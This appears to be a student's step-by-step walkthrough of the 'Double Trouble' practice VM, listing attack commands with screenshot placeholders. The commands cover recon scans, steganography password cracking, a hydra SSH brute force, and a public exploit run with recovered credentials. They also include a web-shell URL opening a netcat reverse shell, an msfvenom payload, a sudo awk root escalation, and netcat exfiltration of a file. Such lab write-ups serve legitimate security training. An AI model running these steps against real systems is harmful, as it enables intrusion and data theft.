# Double Trouble 192.168.56.104
## Andrea Zonnekus 18758119

nmap -F 192.168.56.0/24

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.001.png)

nikto -o nikto -Format text -host <http://192.168.56.104/>

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.002.png)

sudo nmap -sV -Pn $host --version-all -oX host.nmap

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.003.png)

dirb -i 192.168.56.104 > dirb &

sudo searchsploit -v --nmap host.nmap -jw

<https://www.exploit-db.com/exploits/50176>

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.004.png)

(keep this for later)

We can see from nikto that we have the /install directory available, for csx follow:

<https://topsecalphalab.github.io/CVE/qdPM9.1-Installer-Cross-Site-Scripting>

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.005.png)

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.006.png)



browser recon

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.007.png)

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.008.png)

<https://www.exploit-db.com/exploits/50176>

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.009.png)
![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.010.png)
![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.011.png)

Get to next steps

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.012.png)



try to do something useful with that (after a little while I realised that encoded rush is just rush)

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.013.png)

steghide --info doubletrouble.jpg

sudo stegseek --crack doubletrouble.jpg /usr/share/wordlists/rockyou.txt dt\_results.txt

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.014.png)

use to log in

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.015.png)



sudo hydra -l otis -P /usr/share/legion/wordlists/ssh-betterdefaultpasslist.txt -e nsr $host ssh

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.016.png)

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.017.png)

sudo python3 50944.py -url http://192.168.56.104:80/ -u otisrush@localhost.com -p otis666

<https://www.exploit-db.com/exploits/50944>

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.018.png)

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.019.png)

info

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.020.png)![](Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.021.png)

<http://192.168.56.104/uploads/users/429075-backdoor.php?cmd=nc%20192.168.56.102%204444%20-e%20/bin/bash>

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.022.png)

touch tst

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.023.png)

msfvenom -p linux/x64/meterpreter/reverse\_tcp LHOST=192.168.56.102 LPOST=4444 -o shell

find / -user root \( -perm -4000 -o -perm -2000 \) 2>/dev/null

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.024.png)

nc -lvp 666 > pwd

nc 192.168.56.104 4444 < shell (from attacker)

nc -lp 4444 > shell (from victim)

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.025.png)

python3 -c 'import pty; pty.spawn("/bin/bash")'

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.026.png)

sudo -l

sudo awk 'BEGIN {system("/bin/bash")}'

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.027.png)

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.028.png)

no locate available, but home dir looks interesting, note the ova and it’s size

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.029.png)

sudo nc -lzp 4444 > second.ova

nc 192.168.56.102 4444 < doubletrouble.ova

ls -lah

![](double_trouble1_steps/Aspose.Words.97293ee5-24b2-4656-ad0b-33afda096b28.030.png)
